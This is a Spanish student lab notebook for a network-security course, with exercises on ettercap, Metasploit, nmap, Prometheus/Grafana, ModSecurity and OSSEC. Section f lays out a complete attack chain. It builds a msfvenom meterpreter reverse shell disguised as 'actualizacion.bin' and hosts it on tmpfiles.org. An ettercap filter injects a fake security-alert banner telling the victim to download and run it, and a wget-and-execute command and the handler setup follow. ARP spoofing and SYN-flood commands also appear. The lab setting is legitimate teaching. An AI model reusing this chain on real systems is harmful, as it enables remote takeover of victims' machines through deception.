1. Vamos al fichero /etc/ettercap/etter.conf y modificamos los siguientes valores:
	
	a. ec_uid y ec_gid a 0.

	b. remote browser a “NOMBRE NAVEGADOR http://%host%url”.

	Nosotros usamos w3m o lynx, pero vale cualquier navegador de texto:
```bash
remote_browser = "w3m http://%host%url"
remote_browser = "lynx http://%host%url"
```

3. Después, usamos el siguiente comando:
```bash
ettercap -Tq -i ens33 -P remote_browser -M arp:remote /10.11.48.175// /10.11.48.1//
```


4. La víctima usará el navegador para buscar algo (usar el navegador puesto en el fichero del ettercap). Si todo va bien, deberíamos haber entrado en la misma página que la víctima. Si hace click en un enlace dentro de esa página, nosotros también deberíamos entrar. **Usar w3m en la defensa**.
```bash
w3m www.google.com
````

Si todo va bien, deberíamos haber entrado en la misma página que la víctima. Si hace click en un enlace dentro de esa página, nosotros también deberíamos entrar.

Nos redirige a la misma página que la víctima buscó y la vemos en nuestra pantalla. Pero no es un escritorio remoto, solo nos redirige a sus búsquedas pero no muestra su pantalla en tiempo real ni lo que está haciendo, pero si podemos ver las páginas a las que accede.

<br>
<br>

---

### **Apartado f) Instale metasploit. Haga un ejecutable que incluya un Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.**

Elimino splunk e instalo metasploit. No dejarlo activo por defecto. Arrancarlo solo cuando sea necesario.

Metasploit es un framework (conjunto de herramientas) para desarrollar, probar y ejecutar exploits y payloads contra sistemas. Es muy usado en seguridad informática para pruebas de penetración y análisis.

1- Instalación de metasploit:
```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

  -  Para abrir Metasploit
```bash
msfconsole
```
  - O en modo silencioso (sin banner)
```bash
msfconsole -q
```

Para salir simplemente **exit** o **Ctrl+D**.


<br>

2- Payload:
    Exploit = La llave que abre la cerradura (vulnerabilidad)
    Payload = Lo que haces después de entrar (código que se ejecuta)
Un payload en Metasploit es la parte del exploit que se ejecuta en el sistema objetivo después de que una vulnerabilidad ha sido explotada con éxito.


Como atacantes vamos a engañar a la víctima para que lea un pdf. Es la víctima la que se conecta al ssh.
Buscar los comandos en wireshark, o darle a las flechas hasta que aparezca el que queramos.

Tenemos que darle permisos al fichero que le mandamos a nuestro compañero.
Tenemos que mandar dichos permisos a través de un túnel. Si no lo hacemos, no funciona.
Hay que usar meterpreter, que usa comandos distintos. Tenemos que saber que comandos tenemos que usar.


Una vez que sabemos que funciona metasploit, tenemos que hacer el filtro de ettercap (si encuentras un tag de este estilo, cambialo por eso otro -> tendremos que hacer esto en un html). Tenemos que usar ingenieria social. Tenemos que hacer que nuestro compañero entre en algo que trampa que le mandemos.

En cuanto al fichero, tiene que descargarse algo que funcione. No poner un dropbox ni drive ni nada de eso. NUBE  ni de coña!!!!!


**Ingeniería Social**:
Creamos una ventanita en la que la víctima tiene que entrar. Va abrir un html normal y luego hacemos que funcione el ettercap.

1-Primero tiene que funcionar metasploit.
2-Luego ya tenemos que usar ettercap.

<br>

**PASOS**:
1-Creamos un túnel:
```
ssh -R 4444:localhost:4444 lsi@10.11.48.175
```
Crea un "puente secreto" entre tu máquina y la de tu compañero.

    En la víctima: Abre el puerto 4444

    En tu máquina: Recibe las conexiones del puerto 4444 de la víctima

    El payload se conecta a 127.0.0.1:4444 (local en la víctima)

    El túnel redirige esa conexión a tu Metasploit

Con esto no necesitaremos más adelante que la víctima acepte permisos.

2-Creamos payload:
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > actualizacion.bin
```

Si usamos el túnel a Ip debe ser 127.0.0.1. Si no usamos debe ser la nuestra: 10.11.48.202

msfvenom es la herramienta de metaspolit que genera payloads.
- [p] indica el tipo de payload que se generará (en este caso un reverse tcp, lo que significa que el payload abrirá una conexión TCP inversa en el host especificado).

- [LHOST] indica el host donde se generará la conexion (ip del atacante).

- [LPORT] indica el puerto donde se generará (puerto que le metimos al metasploit).

- [-f] indica el formato de salida del payload (en este caso .elf).

- [> actualizacion.bin] esta parte redirige la salida del comando al archivo "actualizacion.bin".

<br>

3-Permisos
```bash
chmod +x actualizacion.bin
```

Convierte el archivo en un programa que puede ejecutarse en Linux.

<br>


4-Subir el payload y el script a Internet:
```bash
curl -F "file=@actualizacion.bin" https://tmpfiles.org/api/v1/upload
```
o manualmente en  tmpfiles.org

**Los archivos en tmpfiles.org expiran en 1 hora** -> subirlos antes de hacer el ataque. Verificar que el enlace funciona.

Cada vez que tengamos una URL nuevo tenemos que cambiarla abajo en el filtro (SIGUIENTE PASO).

5-Crear el filtro ettercap:
```html:
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish!");
        msg("###### Eliminando compresión ######\n");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    replace("</body>", "</body><div style='position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:15px;text-align:center;z-index:9999;font-family:Arial;font-size:16px;'><h2>⚠️ ALERTA DE SEGURIDAD</h2><p><b>Actualizacion critica requerida:</b> Ejecute este parche inmediatamente</p><a href='http://tmpfiles.org/5766984/actualizacion.bin' style='background:white;color:red;padding:10px;text-decoration:none;font-weight:bold;margin:10px;display:inline-block;'>🔒 DESCARGAR PARCHE</a><p style='font-size:12px;'>Despues: chmod +x actualizacion.bin && ./actualizacion.bin</p></div>");
    replace("</BODY>", "</BODY><div style='position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:15px;text-align:center;z-index:9999;font-family:Arial;font-size:16px;'><h2>⚠️ ALERTA DE SEGURIDAD</h2><p><b>Actualizacion critica requerida:</b> Ejecute este parche inmediatamente</p><a href='http://tmpfiles.org/5766984/actualizacion.bin' style='background:white;color:red;padding:10px;text-decoration:none;font-weight:bold;margin:10px;display:inline-block;'>🔒 DESCARGAR PARCHE</a><p style='font-size:12px;'>Despues: chmod +x actualizacion.bin && ./actualizacion.bin</p></div>");
}
```

Pone tu archivo en internet para que tu compañero lo pueda descargar. Además todo el tráfico que genere desde un navegador se le redirigirá a esta página.

Esta página usa Ingeniería Social, le sale a la víctima en cualquier página que entre y le indica que hay una actualización pendiente en su navegador y que debe descargarla.

<br>

6-Compilarlo:
```bash
etterfilter filtro.filter -o filtro.ef
```
Es unha herramienta de ettercap que procesa archivos de filtro (los archivos de filtro se procesan para aplicar reglas específicas a los datos o al tráfico que se está filtrando).

 [-o] -> especifica el nombre del archivo de salida que se generará

<br>

6-Permite que el tráfico pase a través de tu máquina (importante para el ataque Man-in-the-Middle).
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Habilitamos la opcion de reenvios de paquetes IP. 

<br>

**ATAQUE**:
En una terminal:

7-Ejecutar Ettercap para esnifar la paquetería de la víctima:
```bash
ettercap -T -i ens33 -M arp:remote /10.11.48.175// /10.11.48.1// -F filtro.ef
```

[-F] carga el filtro compilado


En otra terminal:

8-Abrir metasploit:

- Si usamos el túnel:
```bash
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit
```

- Si no usamos túnel:
```bash
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 10.11.48.202 
set LPORT 4444
exploit
```


Si ahora la víctima ejecuta cualquier página con w3m le redirige a mi página. Tendrá que descargar el archivo que le pone ahí y ejecutarlo y mientras estamos con exploit en metasploit se nos abrirá meterpreter.
```bash
meterpreter>
```

Para descargar basta con clicar en el enlace o hacer:
```bash
wget -q -O actualizacion.bin http://tmpfiles.org/5766984/actualizacion.bin && ./actualizacion.bin
```

**!!Estamos dentro de la máquina del compañero!!**

Comando de metasploit:
```bash
sysinfo          # Información del sistema comprometido
getuid           # Ver qué usuario eres
ps               # Listar procesos en ejecución
pwd              # Ver directorio actual
ls               # Listar archivos
cd /ruta         # Cambiar directorio
cat archivo.txt  # Ver contenido de archivo
search -f *.txt  # Buscar archivos por patrón
upload /ruta/local/file.txt   # Subir archivo a la víctima
download file.txt /ruta/local # Descargar archivo de la víctima
shell            # Acceder a la terminal normal de la víctima
```

#### RESUMEN FÁCIL:

TÚNEL SSH ←→ PAYLOAD LOCAL ←→ VÍCTIMA ←→ ETTERCAP ←→ METASPLOIT



<br>
<br>

---

### **Apartado g) Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).**

**Carlos dice que sea lo último que hagamos antes de acabar la práctica 2!!!!**



<br>
<br>

---

### **Apartado h) Pruebe distintas técnicas de host discovey, port scanning y OS fingerprinting sobre las máquinas del laboratorio de prácticas en IPv4. Realice alguna de las pruebas de port scanning sobre IPv6. ¿Coinciden los servicios prestados por un sistema con los de IPv4?.**

**NADA de IPv6**

De las que están activas cuales son sus MAC etc. Si ponemos toda la red, petamos el sistema!!!

Poner solo una red pequeña o solo al compañero y la puerta del enlace por ejemplo. Probar también todo el 48 (más riesgo).


- Host discovery: descubrir equipos en la red local

```bash
nmap -sL 10.11.48.0/23
nmap -sP 10.11.48.0/23
```

- [-sL]: NO escanea puertos y NO hace ping a los equipos. SOLO lista las IPs/hosts que serían escaneadas
- [-sP]: No escanea puertos, solo dice que equipos están activos. Es lo mismo que -sn


<br>

- Port scanning (escaneo de puertos)
  
Podemos hacer escaneo de puertos de todos los equipos de /48 o solo de mi compañero. Usaremos nmap para descubrir que puertos están abiertos.

En mi caso voy a probar solo con mi compañero:

```bash
nmap -sS 10.11.48.175
```

- [-sS]: escaneo SYN rápido y sigiloso

Salida:
```bash
root@ismael:~# nmap -sS 10.11.48.175
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-30 12:35 CET
Nmap scan report for 10.11.48.175
Host is up (0.00026s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
514/tcp open  shell
MAC Address: 00:50:56:97:29:8B (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
```

Aquí vemos que mi comapñero tiene los puertos 22 (ssh) y el 514 (tcp) abiertos.
<br>

Escaneo completo TCP:
```bash
nmap -sT -p- 10.11.48.175
```

La salida es igual que la anterior.

Con -p podemos especificar los puertos que queremos comprobar si están o no abiertos.

<br>

- OS fingerprinting (detección de Sistema Operativo)
```bash
nmap -O 10.11.48.175
```

Salida:
```bash
root@ismael:~# nmap -O 10.11.48.175
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-30 12:48 CET
Nmap scan report for 10.11.48.175
Host is up (0.00041s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
514/tcp open  shell
MAC Address: 00:50:56:97:29:8B (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
```
Si la máquina está apagada o bloqueando ICMP esto no funciona.

Escaneo completo con OS detection:
```bash
nmap -A 10.11.48.175
```

<br>

#### RESUMEN FÁCIL:

- Host discovery: nmap -sL 10.11.48.1/23.
- Port scanning: nmap -sS IP COMPAÑERO.
- OS fingerprinting: nmap -O IP COMPAÑERO.

De IPv6 no hacemos nada. La respuesta a la pregunta de si coinciden los servicios de IPv4 e IPv6 es que normalmente sí, pero a veces no, dependiendo de como esté configurado el equipo.

<br>
<br>

---

### **Apartado i) Obtenga información “en tiempo real” sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.**


- Conexiones de la máquina:

Recordamos de la práctica anterior como ver conexiones antiguas (ss, netstat):

```bash
ss -tulpn
netstat -putona
```

Para ver en tiempo real usamos **watch**:
```bash
watch -n 2 "ss -tulnp"
watch -n 2 "netstat -putona"
```

- [-n 2] indica que se actualiza cada 2 segundos.

<br>

- Ancho de banda en tiempo real:

1-Iftop (visual, por IP)

Es como un "monitor de tráfico en tiempo real" para tu conexión de internet o red. Muestra qué programas o conexiones 
están usando más ancho de banda en ese momento.

Instalamos iftop 
```bash
apt install iftop
```

Par ver el tráfico de red por conexión en una interfaz específica:
```bash
iftop -i ens33
```

<img width="1585" height="813" alt="imagen" src="https://github.com/user-attachments/assets/81c5cca6-4d28-44c6-871e-8a1a3e8fef16" />

Es un resumen de tráfico de red por conexiones/hosts. Cada fila muestra quién habla con quién (=> enviar, <= recibir) y cuánta información se ha transferido y las tasas de transferencia.

Parte inferior:

- TX: tráfico transmitido (enviado) por tu máquina.
  - cum: acumulado total enviado (ej. 15,0KB).
  - peak: pico de transferencia observado (ej. 8,59Kb).
  - A la derecha aparecen las tasas recientes (ej. 5,23Kb 2,36Kb 3,33Kb) — instantánea / medias.

- RX: tráfico recibido (lo mismo pero entrante).

TOTAL: suma TX + RX (volumen y picos combinados).

A la derecha de RX/TX hay columnas pequeñas con valores (320b 426b 539b) que son contadores por segundos o por muestreo (paquetes/bytes en ventanas pequeñas).

<br>


2-Nethogs (por proceso):

Es una herramienta que te dice qué procesos están usando la red y cuánto están enviando y recibiendo.

Instalarlo:
```bash
apt install nethogs
```

Para ver el tráfico por proceso:
```bash
nethogs ens33
```

<img width="1584" height="167" alt="imagen" src="https://github.com/user-attachments/assets/ef649fc2-05ed-444e-a93d-494723edc922" />

NetHogs muestra qué procesos están usando la red. Aquí solo hay uno: tu sesión SSH.

- sshd (tu conexión SSH) está enviando ~0.46 KB/s y recibiendo ~0.07 KB/s.

- El otro proceso no está usando red.

En total, la máquina está usando muy poco tráfico.

#### RESUMEN FÁCIL

- Conexiones en tiempo real:

watch -n 2 "ss -tulnp"

watch -n 2 "netstat -putona"

- Ancho de banda de las conexiones:

iftop -i ens33    # Por Ip en una interfaz específica.

nethogs ens33     # Por proceso

Hay más opciones como vnstat, tcptrack o tshark.


<br>
<br>

---

### **Apartado j) Monitorizamos nuestra infraestructura.:**

**- Instale prometheus y node_exporter y configúrelos para recopilar todo tipo de métricas de su máquina linux.**
  
**- Posteriormente instale grafana y agregue como fuente de datos las métricas de su equipo de prometheus.**

**- Importe vía grafana el dashboard 1860.**

**- En los ataques de los apartados m y n busque posibles alteraciones en las métricas visualizadas.**


> IMPORTANTE: tener la hora bien puesta, si la tenemos mal no funciona ya que hace calculos a tiempo real

> Poñer también en la configuracion de prometheus.yml el servidor do compañeiro (un target con su ip) 

En Prometeheus deberemos ver los datos de la máquina en tiempo real no en estático. La gráfica debe crecer hacia la izquierda y con picos altos cuanfo se realizan ataques como DoS debido a que hay mucho tráfico.

<br>

**- Instale prometheus y node_exporter y configúrelos para recopilar todo tipo de métricas de su máquina linux.**

**Prometheus** es un sistema de monitorización y base de datos de series temporales. Recoge métricas de diferentes servicios, las almacena y permite consultarlas. Necesitamos un sistema centralizado que almacene todas las métricas de nuestra máquina para poder analizarlas y visualizarlas luego en Grafana.

Instalar Prometheus:
```bash
apt install prometeheus
```

Prometheus ya viene con servicio configurado. Vamos a desactivar el activado automático y vamos a habilitarlo SOLO cuando lo queramos usar.
```bash
systemctl stop prometheus
systemctl disable prometheus
```

**Para activar prometheus** (para paralo hacer un stop):
```bash
systemctl enable prometheus
systemctl start prometehus
```

Para abrir la interfaz web:  **http://10.11.48.202:9090**

<br>

**Node-exporter** es un “exportador” de métricas del sistema Linux. Envía métricas de CPU, RAM, disco, red y más a Prometheus. Prometheus por sí solo no sabe nada de tu sistema. Node Exporter “expone” esas métricas para que Prometheus las pueda recopilar.

Instalar node exporter:
```bash
wget https://github.com/prometheus/node_exporter/releases/download/v1.10.2/node_exporter-1.10.2.linux-amd64.tar.gz
tar -xvzf node_exporter-1.10.2.linux-amd64.tar.gz
cd node_exporter-1.10.2.linux-amd64
./node_exporter
```

```bash
cd node_exporter-1.10.2.linux-amd64
mv node_exporter /usr/local/bin/  # Mover el binario a /usr/local/bin
chmod +x /usr/local/bin/node_exporter
```

Ahora estará disponible en: http://10.11.48.202:9100/metrics


Para activarlo, ./node_exporter. Para ver si funciona, lo mismo que para el prometheus pero con el puerto 9100. Tenemos que abrir dos terminales para que el node_exporter se conecte con el prometheus. Una vez instalado node_exporter, procedemos a configurar prometheus para pasarle sus métricas.

Tenemos que añadir esto en el fichero prometheus.yml-
```bash
nano /etc/prometheus/prometheus.yml
```

```bash
scrape_configs:
  - job_name: "node"
    static_configs:
      - targets: ["localhost:9100"]  # dirección de Node Exporter
```

En mi caso ya estaba configurado así.

Ahora vamos a desactivar el inicio automático del servicio de node-exporter y vamos a activarlo SOLO cuando nos haga falta:
```bash
systemctl stop prometheus-node-exporter
systemctl disable prometheus-node-exporter
systemctl enable prometheus-node-exporter
```

**Para activar node-exporter** (para paralo hacer un stop):
```bash
systemctl start prometheus-node-exporter
```


Ahora ambos están corriendo:
```bash
root@ismael:~/node_exporter-1.10.2.linux-amd64# netstat -tulpn | grep 9100
tcp6       0      0 :::9100                 :::*                    LISTEN      62880/prometheus-no
root@ismael:~/node_exporter-1.10.2.linux-amd64# netstat -tulpn | grep 9090
tcp6       0      0 :::9090                 :::*                    LISTEN      63105/prometheus
```

Podemos ver las métricas en Prometheus:

1-http://10.20.48.202:9090

2-Ve a “Targets” → ahí verás ambos jobs (prometheus y node) con estado UP.

3-Puedes ir a “Graph”, escribir métricas como node_cpu_seconds_total o node_memory_MemAvailable_bytes y verlas en tiempo real.

Métricas en Node-exporter:

1- Abre en el navegador o con curl: http://10.20.48.202:9100/metrics.

Verás todas las métricas del sistema en texto plano.

Al activar prometheus y node_exporter, nos metemos en la página del prometheus y
si todo va bien, nos debería salir esto en la pestaña Status > Targets:

<br>

Vamos a hacer que los servicios solo estén activos cuando nosotros los activemos. Par ello:

<img width="950" height="567" alt="imagen" src="https://github.com/user-attachments/assets/dc39ed4c-8587-4bb4-af55-7d4694c57d15" />

<br>

**- Posteriormente instale grafana y agregue como fuente de datos las métricas de su equipo de prometheus.**

Grafana es una herramienta de visualización y dashboards open source.

Resumen:
```text
Node Exporter → Prometheus → Grafana
     ↓              ↓           ↓
Métricas del   Almacena    Muestra gráficos
sistema Linux  los datos   y dashboards bonitos
```

Instalamos Grafana:
```bash
# Instalar dependencias
sudo apt install -y adduser libfontconfig1 musl

# Descargar versión OSS (gratuita)
wget https://dl.grafana.com/oss/release/grafana_10.2.2_amd64.deb

# Instalar
sudo dpkg -i grafana_10.2.2_amd64.deb

# Si hay errores de dependencias:
sudo apt-get install -f
```

Iniciar grafana:
```
/bin/systemctl start grafana-server
```

Grafana corre en el puerto 3000. Podemos acceder a él en: **http://10.11.48.202:3000**

Por defecto el usuario es admin y la contraseña también. Nos pide actualizarla. Yo he puesto la misma que la del user lsi.

<br>

Vamos a añadir ahora Prometehus en Grafana:

- Pinchamos en la ruedita (en el logo del grafana).

- Le damos a “Data Sources” y luego a “Add data source”.

- Le damos a Prometheus.

- Un poco más abajo, en el campo de la URL, metemos la URL anterior del prometheus.

- Abajo de todo, guardamos los cambios pulsando en “Save & test”.

<br>

**- Importe vía grafana el dashboard 1860.**

1- Buscamos Grafana Labs: https://grafana.com/grafana/dashboards/

2- En la página verás un cuadro de búsqueda que dice algo como: "Search dashboards..."
Ahí buscamos 1860.

3- Copiamos el ID de la última actualización: 10242

4- En nuestra página de Grafana: Dashboards > New > Import. Pegamos el ID y guardamos el dashboard.

Ya estaría, debemos ver algo así:

<img width="1911" height="801" alt="imagen" src="https://github.com/user-attachments/assets/25b06500-c1e6-4be5-85d4-7a3ab21129e8" />

<br>

**- En los ataques de los apartados m y n busque posibles alteraciones en las métricas visualizadas.**

Más adelante comentaremos este apartado el los respectivos ejercicios.

<br>

#### RESUMEN FÁCIL

```text
TU MÁQUINA LINUX
     ↓
Node Exporter (puerto 9100)
     ↓  Exporta métricas del sistema
Prometheus (puerto 9090) 
     ↓  Recoge y almacena métricas
Grafana (puerto 3000)
     ↓  Muestra dashboards visuales
TÚ 👀 ← Ve gráficos bonitos en el navegador
```


<br>
<br>
---

### **Apartado k) **PARA PLANTEAR DE FORMA TEÓRICA.: ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas? ¿Y mediante un DoS de tipo reflective flooding attack?.**

**Carlos no lo mira mucho, solo Nino**

1-Direct attack: El ataque directo DoS consiste en envíar paquetes DIRECTAMENTE desde tu máquina a la víctima para hacer que servicios dejen de funcionar, consumirle recursos Envío masivo de paquetes de manera directa a la víctima (la
dirección origen es normalmente falsificada)

Para direct attack: Comando packit -c 0 -b 0 -s IP origen -d IP destino -F S -S 1000
-D 22. Explicación del comando:


2- Reflective flooding attack: Se utilizan nodos intermedios como amplificadores
(routers, servidores web, DNS …). El atacante envía paquetes que requieren
respuesta a los amplificadores con ip origen la ip de la víctima ( los
amplificadores responderán masivamente a la víctima).


<br>
<br>

---

### **Apartado l) Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7). ¿Cómo podría proteger dicho servicio ante este tipo de ataque? ¿Y si se produjese desde fuera de su segmento de red? ¿Cómo podría tratar de saltarse dicha protección?**


Ataques Apache recomendados:
-perl

-python en Github: SlowLoris

<br>

Defensas Apache recomendadas:
-ModSecurity. Carlos obliga a usar ModSecurity. 

Existen 5 paquetes de apache que protegen sin querer.

Probar varios y probar que podemos atacar y nosotros podemos defendernos.

<br>
<br>

---

### **Apartado m) Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?**


Actualizar todos los módulos de ModSecurity. Nos va mandar realizar ataques sin él primero y ver que nadie defiende. Si ahora atacamos cn ModSecurity activado la máquina si que deberñia defenderse. 

Tienes que defenderse de los 4 ataques posibles que damos!!! En la defensa no probará todos, solo alguno

<br>
<br>

### **Apartado n) Buscamos información.:  
- Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.
  
- Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña.
  
- ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?. En caso negativo, obtenga todos los nombres.dominio posibles de la UDC.
  
- ¿Qué gestor de contenidos se utiliza en www.usc.es?**



Si es factible cambiar de zona -> mostrarlo
Si no es factible mostrar también



<br>
<br>

---

### **Apartado o) Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.**



<br>
<br>

---

## ATAQUES Y DEFENSAS DE FUERZA BRUTA:

**Ataques de fuerza bruta:** Usar Medusa o hydra para atacar. 

**Defensas de fuerza bruta:** Usar OOSEC para defenderse. Añadir Ips baneables a hosts.deny para bloquear accesos.




### **Apartado p) Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas.**

Usar Medusa o Hydra para atacar. 

Probar sobre un usuario mejor, no sobre la red -> Fuerza bruta bucle for sobre el usuario de lsi del compañero (no poner diccionario de usuarios, solo de contraseñas).




<br>

---

### **Apartado q) Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”.**

Usar OSSEC para defender a los ataques. Baneará la Ip que está realizando el ataque constantemente.

OSSEC no tiene que defender a un número de ataques. Tiene que defender ya de primeras.

Una vez que OSSEC funciona, hacer un flush de OSSEC y veremos todo en pantalla. Si dejamos de atacar OSSEC se para.

**Carlos nos va decir: Para OSSEC a la cuarta vez** -> Hay que hacerlo bien y explicar porque.



<br>

---

### **Apartado r) Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.**


<br>




















































